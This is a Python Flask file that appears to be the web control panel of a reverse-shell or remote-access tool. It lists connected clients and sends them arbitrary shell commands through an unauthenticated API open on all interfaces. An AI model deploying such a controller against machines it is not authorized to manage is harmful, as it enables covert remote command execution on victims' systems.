import socket
import threading

from flask import Flask, request
from flask_cors import *

from core.server import Server

app = Flask(__name__)
CORS(app, supports_credentials=True)


@app.route('/list', methods=['POST'])
def list_connections():
    """
    获取客户端列表
    """
    if request.method == 'POST':
        # 移除无效连接
        server.test_connections()
        # 创建数组存储客户端地址
        connections = []
        for i, connection in enumerate(server.connections):
            connections.append('{}:{}'.format(connection.address[0], connection.address[1]))
        # 返回列表
        return connections


@app.route('/getcwd', methods=['POST'])
def getcwd():
    """
    获取客户端当前工作目录的路径
    """
    if request.method == 'POST':
        # 获取目标客户端序号
        target = request.get_json()['target']
        # 获取目标客户端连接
        conn = server.connections[target]
        # 发送空命令
        conn.send_command('null', 'null')
        # 接收并返回客户端当前工作目录的路径
        return conn.recv_result()[1]


@app.route('/execute', methods=['POST'])
def execute():
    """
    向客户端发送命令
    """
    if request.method == 'POST':
        try:
            # 获取目标客户端序号
            target = request.get_json()['target']
            # 获取命令
            command = request.get_json()['command']
            # 获取目标客户端连接
            conn = server.connections[target]
            # 发送命令
            conn.send_command(command)
            # 关闭连接
            if command == 'kill':
                # 移除无效连接
                server.test_connections()
                return ['[+] Connection is closed', None]
            # 返回命令执行结果和客户端当前工作目录的路径
            return [conn.recv_result()[1], conn.recv_result()[1]]
        except socket.error:
            server.test_connections()
            return ['[-] Connection is lost', None]
        except IndexError:
            return ['[-] No connection available', None]
        except Exception as e:
            return ['[-] {}'.format(e), None]


if __name__ == '__main__':
    server = Server()
    threading.Thread(target=server.serve, daemon=True).start()
    app.run(host='0.0.0.0', port=8888)
